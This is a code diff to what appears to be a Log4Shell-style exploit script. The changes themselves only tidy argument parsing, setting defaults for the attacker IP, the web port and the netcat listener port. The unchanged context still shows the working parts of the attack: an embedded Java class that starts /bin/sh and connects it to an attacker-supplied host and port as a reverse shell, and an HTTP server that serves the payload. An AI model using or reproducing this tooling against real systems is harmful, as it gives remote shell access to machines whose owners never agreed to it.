@@ -20,7 +20,7 @@ public class Exploit {
 
   public Exploit() throws Exception {
     String host="%s";
-    int port=%s;
+    int port=%d;
     String cmd="/bin/sh";
     Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
     Socket s=new Socket(host,port);
@@ -70,7 +70,7 @@ public class Exploit {
   # start the web server
     
   print(f"[+] Starting the Web server on port {webport} http://0.0.0.0:{webport}")
-  httpd = HTTPServer(('0.0.0.0', int(webport)), SimpleHTTPRequestHandler)
+  httpd = HTTPServer(('0.0.0.0', webport), SimpleHTTPRequestHandler)
   httpd.serve_forever()
 
 
@@ -105,20 +105,20 @@ if __name__ == "__main__":
   try:
     parser = argparse.ArgumentParser(description='please enter the values ')
 
-    parser.add_argument('--userip', metavar='userip', type=str,
-                        nargs='+', help='Enter IP for LDAPRefServer & Shell')
+    parser.add_argument('--userip', metavar='userip', type=str, default='localhost',
+                        help='Enter IP for LDAPRefServer & Shell')
 
-    parser.add_argument('--webport', metavar='webport', type=str,
-                        nargs='+', help='listener port for HTTP port')
+    parser.add_argument('--webport', metavar='webport', type=int, default='8000',
+                        help='listener port for HTTP port')
 
-    parser.add_argument('--lport', metavar='lport', type=str,
-                        nargs='+', help='Netcat Port')
+    parser.add_argument('--lport', metavar='lport', type=int, default='9001',
+                        help='Netcat Port')
 
     args = parser.parse_args()
 
     #print(args.userip)
 
-    payload(''.join(args.userip), ''.join(args.webport), ''.join(args.lport))
+    payload(args.userip, args.webport, args.lport)
 
   except KeyboardInterrupt:
     print(Fore.RED + "user interupted the program.")
